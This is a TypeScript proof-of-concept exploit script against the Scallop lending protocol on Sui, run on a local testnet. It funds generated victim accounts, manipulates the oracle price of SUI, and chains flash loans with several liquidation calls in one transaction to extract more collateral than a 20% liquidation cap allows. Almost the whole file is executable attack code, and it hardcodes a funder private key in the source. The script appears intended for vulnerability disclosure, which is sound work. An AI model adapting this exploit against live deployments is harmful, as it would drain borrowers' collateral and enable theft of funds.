// @ts-nocheck
/**
 * PoC: Multi-Call Liquidation Bypasses 20% Soft Cap
 * Target: Scallop Protocol (Local Testnet)
 * SDK: @mysten/sui (Official)
 */

import { SuiClient } from '@mysten/sui/client';
import { Transaction } from '@mysten/sui/transactions';
import { Ed25519Keypair } from '@mysten/sui/keypairs/ed25519';
import { decodeSuiPrivateKey } from '@mysten/sui/cryptography';

const client = new SuiClient({ url: 'http://127.0.0.1:9000' });

// ==================== KONFIGURASI LOCAL TESTNET ====================
// ID Valid dari output_protocol.json.txt (Epoch 9)
const PKG = "0x4447fa7f281993207692ba0eeff209c699316c0fbdc42c5a1e27e59d4dd6fd60";
const VERSION = "0xa7f721da1598fd7ba932ed3ef85958ada1318cc8697df2a30e2491d7e0a9c6d2";
const MARKET = "0x6044e8e1a7a3d768474678f93a80dee16921ee712768b22c2c70b4486f0cd49d";
const ORACLE = "0x3a7e716c73f7f0471bf7221aea3d31e3729ec0dbd1cf62da73cedbb03ce75d1e";
const REGISTRY = "0xa9f387b821f15ef02e151facd8fdcffe1c14a766538f677d8dd8b95a8c751fee";
const CLOCK = "0x6";

// ID Valid dari output_testcoin (2).json.txt (Epoch 10)
const TEST_COIN_PKG = "0x0e027cb787e9735b869ad976bb6b2d4497d0addb415e1372cbfca2784a953ab0";
const USDC_TYPE = `${TEST_COIN_PKG}::usdc::USDC`;
const ETH_TYPE = `${TEST_COIN_PKG}::eth::ETH`;
const SUI_TYPE = "0x2::sui::SUI";

const USDC_TREASURY = "0xc2deb84266c8ef88d43f35dba448c896f806e662e0b562de4c5f62f36cf49711";
const ETH_TREASURY = "0xab8944a758a3a3de2d6c8a6a9dac3dad5ced71ac9885f51327c1523ec77a1336";

// PRIVATE KEY FUNDER
const funderPrivateKeyStr = "suiprivkey1qzuxayfjwjmrqat03vkjh5nrt66fp4utywud2x8v0k0a6fg453yg7j2kcaa";
const privateKeyBytes = decodeSuiPrivateKey(funderPrivateKeyStr).secretKey;
const funderKeypair = Ed25519Keypair.fromSecretKey(privateKeyBytes);
const funderAddress = funderKeypair.getPublicKey().toSuiAddress();

console.log(`[INIT] Funder Address: ${funderAddress}`);

// ==================== HELPER: CARI ADMIN CAP ====================
async function findAdminCap(): Promise<string> {
    console.log("[INIT] Searching for AdminCap...");
    let cursor = null;
    while (true) {
        const objects = await client.getOwnedObjects({
            owner: funderAddress,
            cursor,
            options: { showType: true },
        });
        for (const obj of objects.data) {
            const objType = obj.data?.type || "";
            if (objType.includes(`${PKG}::app::AdminCap`)) {
                console.log(`[INIT] AdminCap found: ${obj.data.objectId}`);
                return obj.data.objectId;
            }
        }
        if (!objects.hasNextPage) break;
        cursor = objects.nextCursor;
    }
    throw new Error("[INIT] AdminCap not found. Make sure funder is the deployer.");
}

// ==================== HELPER: CARI COIN METADATA ID ====================
async function findCoinMetadata(coinType: string): Promise<string> {
    console.log(`[INIT] Searching for CoinMetadata<${coinType}>...`);
    const response = await client.getCoinMetadata({ coinType });
    if (!response) {
        throw new Error(`CoinMetadata not found for ${coinType}`);
    }
    console.log(`[INIT] CoinMetadata found: ${response.id}`);
    return response.id;
}

// ==================== HELPER: CARI X_ORACLE PACKAGE ID ====================
async function getXOraclePackage(): Promise<string> {
    console.log("[INIT] Extracting XOracle Package ID...");
    const obj = await client.getObject({ id: ORACLE, options: { showType: true } });
    const type = obj.data?.type;
    const match = type?.match(/^(0x[0-9a-fA-F]+)::/);
    if (!match) throw new Error("Failed to parse XOracle package ID from ORACLE object type");
    console.log(`[INIT] XOracle Package ID: ${match[1]}`);
    return match[1];
}

// ==================== HELPER FUNCTIONS ====================

async function executeTx(tx, keypair) {
    tx.setSender(keypair.getPublicKey().toSuiAddress());
    const result = await client.signAndExecuteTransaction({
        signer: keypair,
        transaction: tx,
        options: { showEffects: true, showObjectChanges: true },
    });
    await new Promise(r => setTimeout(r, 1500));
    return result;
}

async function printBalances(address) {
    const suiBalance = await client.getBalance({ owner: address, coinType: SUI_TYPE });
    const usdcBalance = await client.getBalance({ owner: address, coinType: USDC_TYPE });
    const ethBalance = await client.getBalance({ owner: address, coinType: ETH_TYPE });
    console.log(
        `[DEBUG] Balances for ${address.slice(0, 8)}...: ` +
        `SUI=${Number(suiBalance.totalBalance) / 1e9} | ` +
        `USDC=${Number(usdcBalance.totalBalance) / 1e9} | ` +
        `ETH=${Number(ethBalance.totalBalance) / 1e9}`
    );
}

async function readObligationState(obligationId) {
    const fields = await client.getDynamicFields({ parentId: obligationId });
    let collateralAmount = 0n, debtUSDC = 0n, debtETH = 0n;
    for (const field of fields.data) {
        const fieldData = await client.getDynamicFieldObject({ parentId: obligationId, name: field.name });
        const fieldName = JSON.stringify(field.name);
        const fieldValue = fieldData?.data?.content?.fields;
        if (fieldName.includes("Collateral") && fieldValue) collateralAmount = BigInt(fieldValue.amount || 0);
        else if (fieldName.includes("Debt") && fieldValue) {
            if (fieldName.includes("USDC")) debtUSDC = BigInt(fieldValue.amount || 0);
            else if (fieldName.includes("ETH")) debtETH = BigInt(fieldValue.amount || 0);
        }
    }
    return { collateralAmount, debtUSDC, debtETH };
}

// ==================== PHASE 0: INITIALIZE MARKET ====================

async function initializeMarket(adminCapId) {
    console.log("\n[INIT] Initializing Market (Whitelist, Models, Oracle)...");
    
    const suiMetaId = await findCoinMetadata(SUI_TYPE);
    const usdcMetaId = await findCoinMetadata(USDC_TYPE);
    const ethMetaId = await findCoinMetadata(ETH_TYPE);

    const tx = new Transaction();

    tx.moveCall({
        target: `${PKG}::app::whitelist_allow_all`,
        arguments: [tx.object(adminCapId), tx.object(MARKET)],
    });

    tx.moveCall({
        target: `${PKG}::app::init_market_coin_price_table`,
        arguments: [tx.object(adminCapId), tx.object(MARKET)],
    });

    const SCALE = 10n ** 12n;

    const addInterestModel = (coinType, p) => {
        const [modelChange] = tx.moveCall({
            target: `${PKG}::app::create_interest_model_change`,
            typeArguments: [coinType],
            arguments: [
                tx.object(adminCapId),
                tx.pure.u64(p.baseBorrowRatePerSec),
                tx.pure.u64(p.interestRateScale),
                tx.pure.u64(p.borrowRateOnMidKink),
                tx.pure.u64(p.midKink),
                tx.pure.u64(p.borrowRateOnHighKink),
                tx.pure.u64(p.highKink),
                tx.pure.u64(p.maxBorrowRate),
                tx.pure.u64(p.revenueFactor),
                tx.pure.u64(p.borrowWeight),
                tx.pure.u64(p.scale),
                tx.pure.u64(p.minBorrowAmount),
            ],
        });
        tx.moveCall({
            target: `${PKG}::app::add_interest_model`,
            typeArguments: [coinType],
            arguments: [tx.object(MARKET), tx.object(adminCapId), modelChange, tx.object(CLOCK)],
        });
    };

    const addRiskModel = (coinType, p) => {
        const [modelChange] = tx.moveCall({
            target: `${PKG}::app::create_risk_model_change`,
            typeArguments: [coinType],
            arguments: [
                tx.object(adminCapId),
                tx.pure.u64(p.collateralFactor),
                tx.pure.u64(p.liquidationFactor),
                tx.pure.u64(p.liquidationPanelty),
                tx.pure.u64(p.liquidationDiscount),
                tx.pure.u64(p.scale),
                tx.pure.u64(p.maxCollateralAmount),
            ],
        });
        tx.moveCall({
            target: `${PKG}::app::add_risk_model`,
            typeArguments: [coinType],
            arguments: [tx.object(MARKET), tx.object(adminCapId), modelChange],
        });
    };

    const addLimiter = (coinType, limit, cycle, segment) => {
        tx.moveCall({
            target: `${PKG}::app::add_limiter`,
            typeArguments: [coinType],
            arguments: [tx.object(adminCapId), tx.object(MARKET), tx.pure.u64(limit), tx.pure.u32(cycle), tx.pure.u32(segment)],
        });
    };

    const registerDecimals = (coinType, metadataId) => {
        tx.moveCall({
            target: `${PKG}::coin_decimals_registry::register_decimals`,
            typeArguments: [coinType],
            arguments: [tx.object(REGISTRY), tx.object(metadataId)],
        });
    };

    const setMinCollateral = (coinType, amount) => {
        tx.moveCall({
            target: `${PKG}::app::update_min_collateral_amount`,
            typeArguments: [coinType],
            arguments: [tx.object(adminCapId), tx.object(MARKET), tx.pure.u64(amount)],
        });
    };

    // FIX: Tambahkan fungsi setSupplyLimit untuk mencegah abort di mint::mint
    const setSupplyLimit = (coinType, limit) => {
        tx.moveCall({
            target: `${PKG}::app::update_supply_limit`,
            typeArguments: [coinType],
            arguments: [tx.object(adminCapId), tx.object(MARKET), tx.pure.u64(limit)],
        });
    };

    // SUI
    registerDecimals(SUI_TYPE, suiMetaId);
    addInterestModel(SUI_TYPE, {
        baseBorrowRatePerSec: 0n, interestRateScale: 10n ** 7n,
        borrowRateOnMidKink: 10n * (SCALE / 100n), midKink: 60n * (SCALE / 100n),
        borrowRateOnHighKink: 100n * (SCALE / 100n), highKink: 90n * (SCALE / 100n),
        maxBorrowRate: 300n * (SCALE / 100n), revenueFactor: 5n * (SCALE / 100n),
        borrowWeight: 125n * (SCALE / 100n), scale: SCALE, minBorrowAmount: 10n ** 7n,
    });
    addRiskModel(SUI_TYPE, {
        collateralFactor: 60n, liquidationFactor: 70n, liquidationPanelty: 10n,
        liquidationDiscount: 7n, scale: 100n, maxCollateralAmount: 10n ** 17n,
    });
    addLimiter(SUI_TYPE, 10n ** 15n, 86400, 1800);
    setMinCollateral(SUI_TYPE, 0n);
    setSupplyLimit(SUI_TYPE, 10n ** 18n);

    // USDC
    registerDecimals(USDC_TYPE, usdcMetaId);
    addInterestModel(USDC_TYPE, {
        baseBorrowRatePerSec: 0n, interestRateScale: 10n ** 7n,
        borrowRateOnMidKink: 8n * (SCALE / 100n), midKink: 60n * (SCALE / 100n),
        borrowRateOnHighKink: 50n * (SCALE / 100n), highKink: 90n * (SCALE / 100n),
        maxBorrowRate: 150n * (SCALE / 100n), revenueFactor: 5n * (SCALE / 100n),
        borrowWeight: 100n * (SCALE / 100n), scale: SCALE, minBorrowAmount: 10n ** 7n,
    });
    addRiskModel(USDC_TYPE, {
        collateralFactor: 90n, liquidationFactor: 95n, liquidationPanelty: 3n,
        liquidationDiscount: 2n, scale: 100n, maxCollateralAmount: 10n ** 17n,
    });
    addLimiter(USDC_TYPE, 10n ** 15n, 86400, 1800);
    setMinCollateral(USDC_TYPE, 0n);
    setSupplyLimit(USDC_TYPE, 10n ** 18n);

    // ETH
    registerDecimals(ETH_TYPE, ethMetaId);
    addInterestModel(ETH_TYPE, {
        baseBorrowRatePerSec: 0n, interestRateScale: 10n ** 7n,
        borrowRateOnMidKink: 10n * (SCALE / 100n), midKink: 60n * (SCALE / 100n),
        borrowRateOnHighKink: 100n * (SCALE / 100n), highKink: 90n * (SCALE / 100n),
        maxBorrowRate: 300n * (SCALE / 100n), revenueFactor: 5n * (SCALE / 100n),
        borrowWeight: 100n * (SCALE / 100n), scale: SCALE, minBorrowAmount: 10n ** 7n,
    });
    addRiskModel(ETH_TYPE, {
        collateralFactor: 80n, liquidationFactor: 90n, liquidationPanelty: 8n,
        liquidationDiscount: 5n, scale: 100n, maxCollateralAmount: 10n ** 16n,
    });
    addLimiter(ETH_TYPE, 10n ** 15n, 86400, 1800);
    setMinCollateral(ETH_TYPE, 0n);
    setSupplyLimit(ETH_TYPE, 10n ** 18n);

    await executeTx(tx, funderKeypair);
    console.log("[INIT] Market initialized successfully!");
}

// ==================== WHITELIST VICTIM ====================
async function whitelistVictim(adminCapId, victimAddr, label) {
    console.log(`[${label}] Step 2.5: Whitelisting victim ${victimAddr.slice(0, 8)}...`);
    const tx = new Transaction();
    tx.moveCall({
        target: `${PKG}::app::add_whitelist_address`,
        arguments: [
            tx.object(adminCapId),
            tx.object(MARKET),
            tx.pure.address(victimAddr),
        ],
    });
    await executeTx(tx, funderKeypair);
    console.log(`[${label}] Step 2.5 done: Victim whitelisted`);
}

// ==================== PHASE 1: SETUP VICTIM ====================

async function setupVictim(victimKeypair, label, adminCapId, xOraclePkg) {
    const victimAddr = victimKeypair.getPublicKey().toSuiAddress();
    console.log(`\n[${label}] Setting up victim at ${victimAddr}...`);

    const fundTx = new Transaction();
    const [suiCoin] = fundTx.splitCoins(fundTx.gas, [1_010_000_000_000n]);
    fundTx.transferObjects([suiCoin], victimAddr);
    await executeTx(fundTx, funderKeypair);
    console.log(`[${label}] Step 1 done: Funded victim with 1010 SUI`);

    const openTx = new Transaction();
    openTx.moveCall({
        target: `${PKG}::open_obligation::open_obligation_entry`,
        arguments: [openTx.object(VERSION)],
    });
    const openResult = await executeTx(openTx, victimKeypair);
    console.log(`[${label}] Step 2 done: Obligation opened`);

    let obligationId = "";
    let obligationKeyId = "";
    for (const obj of openResult.objectChanges || []) {
        if (obj.type === "created" && obj.objectType?.includes("obligation::ObligationKey")) {
            obligationKeyId = obj.objectId;
        } else if (obj.type === "created" && obj.objectType?.includes("obligation::Obligation")) {
            obligationId = obj.objectId;
        }
    }

    if (!obligationId || !obligationKeyId) {
        throw new Error(`[${label}] Failed to parse obligationId or obligationKeyId.`);
    }

    console.log(`[${label}] Obligation ID:    ${obligationId}`);
    console.log(`[${label}] ObligationKey ID: ${obligationKeyId}`);

    await whitelistVictim(adminCapId, victimAddr, label);

    const depositTx = new Transaction();
    const [collateralCoin] = depositTx.splitCoins(depositTx.gas, [1_000_000_000_000n]);
    depositTx.moveCall({
        target: `${PKG}::deposit_collateral::deposit_collateral`,
        typeArguments: [SUI_TYPE],
        arguments: [
            depositTx.object(VERSION),
            depositTx.object(obligationId),
            depositTx.object(MARKET),
            collateralCoin,
        ],
    });
    await executeTx(depositTx, victimKeypair);
    console.log(`[${label}] Step 3 done: Deposited 1000 SUI collateral`);

    const supplyTx = new Transaction();

    const [usdcCoin] = supplyTx.moveCall({
        target: `${TEST_COIN_PKG}::usdc::mint`,
        arguments: [supplyTx.object(USDC_TREASURY), supplyTx.pure.u64(100_000_000_000_000n)],
    });
    const [sUSDC] = supplyTx.moveCall({
        target: `${PKG}::mint::mint`,
        typeArguments: [USDC_TYPE],
        arguments: [supplyTx.object(VERSION), supplyTx.object(MARKET), usdcCoin, supplyTx.object(CLOCK)],
    });
    supplyTx.moveCall({
        target: `0x2::coin::destroy_zero`,
        typeArguments: [`${PKG}::reserve::MarketCoin<${USDC_TYPE}>`],
        arguments: [sUSDC],
    });

    const [ethCoin] = supplyTx.moveCall({
        target: `${TEST_COIN_PKG}::eth::mint`,
        arguments: [supplyTx.object(ETH_TREASURY), supplyTx.pure.u64(10_000_000_000n)],
    });
    const [sETH] = supplyTx.moveCall({
        target: `${PKG}::mint::mint`,
        typeArguments: [ETH_TYPE],
        arguments: [supplyTx.object(VERSION), supplyTx.object(MARKET), ethCoin, supplyTx.object(CLOCK)],
    });
    supplyTx.moveCall({
        target: `0x2::coin::destroy_zero`,
        typeArguments: [`${PKG}::reserve::MarketCoin<${ETH_TYPE}>`],
        arguments: [sETH],
    });

    await executeTx(supplyTx, funderKeypair);
    console.log(`[${label}] Step 4 done: Minted and supplied USDC and ETH to market`);

    const initPriceTx = new Transaction();
    
    initPriceTx.moveCall({
        target: `${xOraclePkg}::x_oracle::update_price`,
        typeArguments: [SUI_TYPE],
        arguments: [initPriceTx.object(ORACLE), initPriceTx.object(CLOCK), initPriceTx.pure.u64(100_000_000n)],
    });

    initPriceTx.moveCall({
        target: `${xOraclePkg}::x_oracle::update_price`,
        typeArguments: [USDC_TYPE],
        arguments: [initPriceTx.object(ORACLE), initPriceTx.object(CLOCK), initPriceTx.pure.u64(100_000_000n)],
    });

    initPriceTx.moveCall({
        target: `${xOraclePkg}::x_oracle::update_price`,
        typeArguments: [ETH_TYPE],
        arguments: [initPriceTx.object(ORACLE), initPriceTx.object(CLOCK), initPriceTx.pure.u64(200_000_000_000n)],
    });

    await executeTx(initPriceTx, funderKeypair);
    console.log(`[${label}] Step 4.5 done: Initialized oracle prices (SUI=$1, USDC=$1, ETH=$2000)`);

    const borrowUSDCTx = new Transaction();
    const [borrowedUSDC] = borrowUSDCTx.moveCall({
        target: `${PKG}::borrow::borrow`,
        typeArguments: [USDC_TYPE],
        arguments: [
            borrowUSDCTx.object(VERSION),
            borrowUSDCTx.object(obligationId),
            borrowUSDCTx.object(obligationKeyId),
            borrowUSDCTx.object(MARKET),
            borrowUSDCTx.object(REGISTRY),
            borrowUSDCTx.pure.u64(500_000_000n),
            borrowUSDCTx.object(ORACLE),
            borrowUSDCTx.object(CLOCK),
        ],
    });
    borrowUSDCTx.transferObjects([borrowedUSDC], victimAddr);
    await executeTx(borrowUSDCTx, victimKeypair);
    console.log(`[${label}] Step 5 done: Borrowed 500 USDC`);

    const borrowETHTx = new Transaction();
    const [borrowedETH] = borrowETHTx.moveCall({
        target: `${PKG}::borrow::borrow`,
        typeArguments: [ETH_TYPE],
        arguments: [
            borrowETHTx.object(VERSION),
            borrowETHTx.object(obligationId),
            borrowETHTx.object(obligationKeyId),
            borrowETHTx.object(MARKET),
            borrowETHTx.object(REGISTRY),
            borrowETHTx.pure.u64(200_000_000n),
            borrowETHTx.object(ORACLE),
            borrowETHTx.object(CLOCK),
        ],
    });
    borrowETHTx.transferObjects([borrowedETH], victimAddr);
    await executeTx(borrowETHTx, victimKeypair);
    console.log(`[${label}] Step 6 done: Borrowed 0.2 ETH`);

    console.log(`[${label}] Setup complete. Obligation ID: ${obligationId}`);
    return { obligationId, obligationKeyId };
}

// ==================== PHASE 2: TRIGGER (MANIPULASI ORACLE) ====================

async function crashOraclePrice(xOraclePkg) {
    console.log("\n[TRIGGER] Crashing SUI price to $0.40 via Oracle Update...");
    const tx = new Transaction();
    
    tx.moveCall({
        target: `${xOraclePkg}::x_oracle::update_price`,
        typeArguments: [SUI_TYPE],
        arguments: [
            tx.object(ORACLE),
            tx.object(CLOCK),
            tx.pure.u64(40_000_000n),
        ],
    });
    
    await executeTx(tx, funderKeypair);
    console.log("[TRIGGER] SUI price crashed. Victims are now UNHEALTHY!");
}

// ==================== PHASE 3: BEFORE EXPLOIT (Single Call) ====================

async function beforeExploit_singleCall(victimObligationId) {
    console.log("\n" + "=".repeat(60));
    console.log("BEFORE EXPLOIT: Single Liquidation Call");
    console.log("=".repeat(60));

    const stateBefore = await readObligationState(victimObligationId);
    console.log(`[BEFORE] Collateral SUI: ${stateBefore.collateralAmount}`);

    const tx = new Transaction();

    const [flashUSDC, flashReceipt] = tx.moveCall({
        target: `${PKG}::flash_loan::borrow_flash_loan`,
        typeArguments: [USDC_TYPE],
        arguments: [tx.object(VERSION), tx.object(MARKET), tx.pure.u64(50_000_000_000n)],
    });

    const [remainUSDC, collateralCoin] = tx.moveCall({
        target: `${PKG}::liquidate::liquidate`,
        typeArguments: [USDC_TYPE, SUI_TYPE],
        arguments: [
            tx.object(VERSION),
            tx.object(victimObligationId),
            tx.object(MARKET),
            flashUSDC,
            tx.object(REGISTRY),
            tx.object(ORACLE),
            tx.object(CLOCK),
        ],
    });

    tx.moveCall({
        target: `${PKG}::flash_loan::repay_flash_loan`,
        typeArguments: [USDC_TYPE],
        arguments: [tx.object(VERSION), tx.object(MARKET), remainUSDC, flashReceipt],
    });

    tx.transferObjects([collateralCoin], funderAddress);

    await executeTx(tx, funderKeypair);
    const stateAfter = await readObligationState(victimObligationId);

    const extracted = stateBefore.collateralAmount - stateAfter.collateralAmount;
    console.log(`[BEFORE] Single-call extracted: ${extracted} SUI (Expected: ~20% cap)`);
    return { extracted };
}

// ==================== PHASE 4: AFTER EXPLOIT (Multi Call) ====================

async function afterExploit_multiCall(victimObligationId) {
    console.log("\n" + "=".repeat(60));
    console.log("AFTER EXPLOIT: Multi-Call Liquidation");
    console.log("=".repeat(60));

    const stateBefore = await readObligationState(victimObligationId);

    const tx = new Transaction();

    const [f_USDC, r_USDC] = tx.moveCall({
        target: `${PKG}::flash_loan::borrow_flash_loan`,
        typeArguments: [USDC_TYPE],
        arguments: [tx.object(VERSION), tx.object(MARKET), tx.pure.u64(50_000_000_000n)],
    });

    const [f_ETH, r_ETH] = tx.moveCall({
        target: `${PKG}::flash_loan::borrow_flash_loan`,
        typeArguments: [ETH_TYPE],
        arguments: [tx.object(VERSION), tx.object(MARKET), tx.pure.u64(10_000_000_000n)],
    });

    const [rem1, c1] = tx.moveCall({
        target: `${PKG}::liquidate::liquidate`,
        typeArguments: [USDC_TYPE, SUI_TYPE],
        arguments: [
            tx.object(VERSION),
            tx.object(victimObligationId),
            tx.object(MARKET),
            f_USDC,
            tx.object(REGISTRY),
            tx.object(ORACLE),
            tx.object(CLOCK),
        ],
    });

    const [rem2, c2] = tx.moveCall({
        target: `${PKG}::liquidate::liquidate`,
        typeArguments: [ETH_TYPE, SUI_TYPE],
        arguments: [
            tx.object(VERSION),
            tx.object(victimObligationId),
            tx.object(MARKET),
            f_ETH,
            tx.object(REGISTRY),
            tx.object(ORACLE),
            tx.object(CLOCK),
        ],
    });

    tx.moveCall({
        target: `${PKG}::flash_loan::repay_flash_loan`,
        typeArguments: [USDC_TYPE],
        arguments: [tx.object(VERSION), tx.object(MARKET), rem1, r_USDC],
    });

    tx.moveCall({
        target: `${PKG}::flash_loan::repay_flash_loan`,
        typeArguments: [ETH_TYPE],
        arguments: [tx.object(VERSION), tx.object(MARKET), rem2, r_ETH],
    });

    tx.mergeCoins(c1, [c2]);
    tx.transferObjects([c1], funderAddress);

    await executeTx(tx, funderKeypair);
    const stateAfter = await readObligationState(victimObligationId);

    const extracted = stateBefore.collateralAmount - stateAfter.collateralAmount;
    console.log(`[AFTER] Multi-call extracted: ${extracted} SUI (BYPASSED 20% cap!)`);
    return { extracted };
}

// ==================== MAIN EXECUTION ====================

async function main() {
    console.log("╔═══════════════════════════════════════════════════════════╗");
    console.log("║  PoC: Multi-Call Liquidation Bypass (Local Testnet)       ║");
    console.log("╚═══════════════════════════════════════════════════════════╝");

    console.log("\n[DEBUG] Checking Funder Balances...");
    await printBalances(funderAddress);

    const adminCapId = await findAdminCap();
    const xOraclePkg = await getXOraclePackage();

    await initializeMarket(adminCapId);

    const victimA = Ed25519Keypair.generate();
    const victimB = Ed25519Keypair.generate();

    const vA = await setupVictim(victimA, "VICTIM A", adminCapId, xOraclePkg);
    const vB = await setupVictim(victimB, "VICTIM B", adminCapId, xOraclePkg);

    await crashOraclePrice(xOraclePkg);

    console.log("\n[DEBUG] Checking Funder Balances before Exploits...");
    await printBalances(funderAddress);

    const beforeResult = await beforeExploit_singleCall(vA.obligationId);
    const afterResult = await afterExploit_multiCall(vB.obligationId);

    console.log("\n" + "=".repeat(60));
    console.log("FINAL IMPACT ANALYSIS");
    console.log("=".repeat(60));
    console.log(`Single-Call Extracted : ${beforeResult.extracted} SUI`);
    console.log(`Multi-Call Extracted  : ${afterResult.extracted} SUI`);

    if (beforeResult.extracted > 0n) {
        const ratio = Number(afterResult.extracted) / Number(beforeResult.extracted);
        console.log(`\n[IMPACT] Multi-Call extracted ${ratio.toFixed(2)}x MORE collateral!`);
    }
    console.log(`[IMPACT] 20% Soft Cap was BYPASSED via Multi-Call in single PTB!`);
}

main().catch(console.error);
